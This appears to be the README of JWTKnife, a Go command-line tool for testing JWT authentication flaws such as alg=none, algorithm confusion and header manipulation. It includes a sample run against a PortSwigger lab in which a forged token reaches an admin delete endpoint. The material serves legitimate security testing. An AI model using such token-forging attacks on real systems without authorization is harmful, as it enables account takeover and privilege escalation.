### JWTKnife

JWTKnife is an interactive CLI tool for testing JWT-based authentication and authorization.

It inspects a JWT, sends baseline requests, and tests common JWT weaknesses such as:
- alg=none
- Missing or unverified signatures
- RSA → HMAC algorithm confusion
- kid, jwk, and jku header manipulation
- Weak HMAC signing secrets (optional wordlist-based testing)

JWTKnife supports JWTs sent via:
- Authorization: Bearer header
- Cookies
- Custom headers

All tests are checked against baseline responses so results reflect real authorization behavior.

JWTKnife requires the following tools:

- Go – to build and run the CLI
- Docker (optional) – required only for the algorithm confusion with no exposed key attack, which uses the portswigger/sig2n helper container internally
- hashcat (optional) – used only for weak HMAC secret testing with a wordlist

Docker is invoked automatically by JWTKnife when needed. You do not need to run sig2n manually.

### Example Use  
*(PortSwigger Lab: JWT authentication bypass via algorithm confusion with no exposed key)*

```text
% ./jwtknife
jwtknife – JWT auth testing wizard

How do you want to provide the JWT?
  1) Paste JWT into terminal
  2) Read JWT from file
Choose [1-2]: 1
Paste the JWT (you can include 'Bearer '): eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<signature>

Do you have a second JWT issued by the server? (used for alg confusion with no exposed key)
Provide second JWT? [y/N]: y
How do you want to provide the second JWT?
  1) Paste JWT into terminal
  2) Read JWT from file
Choose [1-2]: 1
Paste the second JWT (you can include 'Bearer '): eyJraWQiOiIyM2U0YWY1NC0zYjkwLTRkYzYtOWU5.<payload>.<signature>

Decoded JWT:
  alg: RS256
  kid: 23e4af54-3b90-4dc6-9e9c-62848ddadf63

Where is the JWT sent?
  1) Authorization: Bearer <token>
  2) Cookie
  3) Custom header
Choose [1-3]: 2
Cookie name: session
Unauthenticated URL (accessible without any JWT): https://<lab-id>.web-security-academy.net
Authenticated URL (accessible with the provided JWT): https://<lab-id>.web-security-academy.net/my-account?id=wiener
Privilege-escalation target URL (admin or higher-privilege endpoint): https://<lab-id>.web-security-academy.net/admin/delete?username=carlos

Phase 1: JWT auth attacks

✅ SUCCESS
Attack: alg-confusion-sig2n
Note: admin access via algorithm confusion with recovered RSA key (sig2n)

Forged JWT:
eyJhbGciOiJIUzI1NiIsImtpZCI6IjIzZTRhZjU0LTNiOTAtNGRjNi05ZTljLTYyODQ4ZGRhZGY2MyJ9.<payload>.<signature>

HTTP request / response for successful step:
{Status:302 BodyLen:0 Duration:1.29833325s Err:}